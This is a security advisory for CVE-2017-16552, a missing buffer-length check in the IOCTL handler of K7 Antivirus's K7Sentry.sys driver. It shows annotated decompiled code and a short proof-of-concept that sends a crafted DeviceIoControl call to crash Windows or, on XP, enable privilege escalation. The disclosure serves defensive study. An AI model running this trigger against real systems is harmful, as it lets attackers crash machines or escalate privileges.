# CVE-2017-16552

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 15.1.0.53* 
* **Component**: *K7Sentry.sys 15.1.0.45*

# Details
The issue lies in the dispatch handler for the IRP_MJ_DEVICE_CONTROL (sub_00018FC0). The handler code for IoControlCode 0x950025AC does not check the length of the output buffer before using it and assigns a 4 byte value to the output buffer.

The code snippet below is the decompiled code which has been named and commented up to illustrate the problem.


```C++
PVOID *pOutputBuffer;

case 0x950025A8:
    v9 = sub_15A10(&stIoControlBuffer);
    goto LABEL_117;
case 0x950025AC:
    value_0_or_1 = PossiblySomethingLoggy();
    *v2 = 4;
    // Note: pOutputBuffer is the same as Irp->AssociatedIrp.SystemBuffer
    // VULN: No check has been performed before dereferencing that there is enough space to write
    // a 32-bit value to it.
    *pOutputBuffer = (PVOID)value_0_or_1;
    v9 = 0;
    goto LABEL_117;
case 0x950025B0:
    // CVE-2017-16554
    *pOutputBuffer = (PVOID)13;
    *((_BYTE *)pOutputBuffer + 4) = 0;
    *v2 = 13;
    v9 = 0;
    goto LABEL_117;
```

# PoC Code
This PoC will open a connection to the driver and call it with the approiate IOCTL code to geneate the crash.

```c++
HANDLE hDevice = CreateFileW(L"\\\\.\\k7sentry", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
if (hDevice != INVALID_HANDLE_VALUE)
{
    DeviceIoControl(hDevice, 0x950025AC, (PVOID)arrInBuffer, 0, (PVOID)0xaaaaaaaa, 0, &dwBytesReturned, NULL);
}
```

On Windows XP, this will attempt to write the value 0 or 1 (depending on state) to *0xaaaaaaaa*. On this platform, this could be easily used for a privilege escallation.

On Windows 7 and above, this will attempt to write the value 0 or 1 (depending on state) to 0x00000000 and will cause a BSOD. This would simply be an availability issues.
